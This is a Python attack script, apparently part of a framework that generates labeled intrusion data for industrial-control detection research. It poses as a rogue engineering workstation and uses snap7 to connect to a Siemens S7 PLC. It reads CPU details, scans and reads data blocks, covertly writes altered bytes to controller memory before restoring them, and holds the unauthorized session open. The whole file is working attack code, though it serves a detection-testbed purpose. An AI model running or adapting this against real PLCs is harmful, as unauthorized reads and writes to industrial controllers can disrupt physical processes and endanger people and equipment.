"""
EWS_ROGUE_ENGINEER
Kỹ thuật: Kết nối S7 trực tiếp từ IP attacker (không phải EWS hợp lệ)
          Tự scan DB, đọc CPU info, covert write.
Observable: S7 session từ nguồn lạ, IP không trong whitelist

Gọi từ bash:
  python -m attacks_ext.ews_rogue_engineer \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 300 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import snap7
import time
from attacks_ext.config_ext import base_parser, write_label

try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas


def scan_dbs(client, max_db=20):
    """Scan DB tồn tại — giống attacker thực tế."""
    found = []
    for db_num in range(1, max_db + 1):
        try:
            client.db_read(db_num, 0, 1)
            found.append(db_num)
            print(f"  [SCAN] DB{db_num} ton tai")
        except Exception:
            pass
    return found


def run(args):
    label_prefix = "EWS_ROGUE_ENGINEER"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    client = snap7.client.Client()
    dbs_read = 0

    try:
        print(f"[*] Ket noi S7 tu IP attacker -> {args.target}:{args.rack}/{args.slot}")
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Ket noi thanh cong!")

        # Phase 1: Recon
        print("\n[PHASE 1] Reconnaissance")
        info = client.get_cpu_info()
        module = info.ModuleTypeName.decode().strip()
        serial = info.SerialNumber.decode().strip()
        state = client.get_cpu_state()
        print(f"  [INFO] Module: {module}")
        print(f"  [INFO] Serial: {serial}")
        print(f"  [INFO] State:  {state}")

        # Phase 2: Auto scan DB
        print("\n[PHASE 2] Data Exfiltration — Auto scan DB")
        dbs = scan_dbs(client)

        if dbs:
            for db_num in dbs[:5]:
                try:
                    data = client.db_read(db_num, 0, min(50, 100))
                    print(f"  [READ] DB{db_num}: {data[:8].hex()}...")
                    dbs_read += 1
                    time.sleep(1)
                except Exception as e:
                    print(f"  [WARN] DB{db_num}: {e}")
        else:
            print("  [!] Khong co DB — doc Marker area")
            try:
                mk = client.read_area(Areas.MK, 0, 0, 20)
                print(f"  [READ] MK0-19: {mk.hex()}")
                dbs_read += 1
            except Exception as e:
                print(f"  [WARN] MK read: {e}")

        # Phase 3: Covert write
        print("\n[PHASE 3] Covert Write")
        if dbs:
            target_db = dbs[0]
            try:
                current = client.db_read(target_db, 0, 10)
                modified = bytearray(current)
                modified[0] = (modified[0] + 1) % 256
                client.db_write(target_db, 0, bytes(modified[:10]))
                print(f"  [WRITE] DB{target_db} byte[0]: {current[0]} -> {modified[0]}")
                time.sleep(2)
                client.db_write(target_db, 0, bytes(current[:10]))
                print(f"  [RESTORE] DB{target_db} khoi phuc")
            except Exception as e:
                print(f"  [WARN] DB write: {e}")
        else:
            try:
                original = bytes(client.read_area(Areas.MK, 0, 10, 2))
                modified = bytearray(original)
                modified[0] = (modified[0] + 3) % 256
                client.write_area(Areas.MK, 0, 10, modified)
                print(f"  [WRITE] MK10: {original[0]} -> {modified[0]}")
                time.sleep(2)
                client.write_area(Areas.MK, 0, 10, bytearray(original))
                print(f"  [RESTORE] MK10 khoi phuc")
            except Exception as e:
                print(f"  [WARN] MK write: {e}")

        # Phase 4: Keep-alive
        print(f"\n[PHASE 4] Duy tri session bat hop le...")
        keep_alive = min(10, max(3, args.duration // 5))
        for i in range(keep_alive):
            client.get_cpu_state()
            time.sleep(3)
            print(f"  [KEEP-ALIVE] {i+1}/{keep_alive}")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"dbs_read={dbs_read}")


def main():
    p = base_parser("EWS Rogue Engineer Attack")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
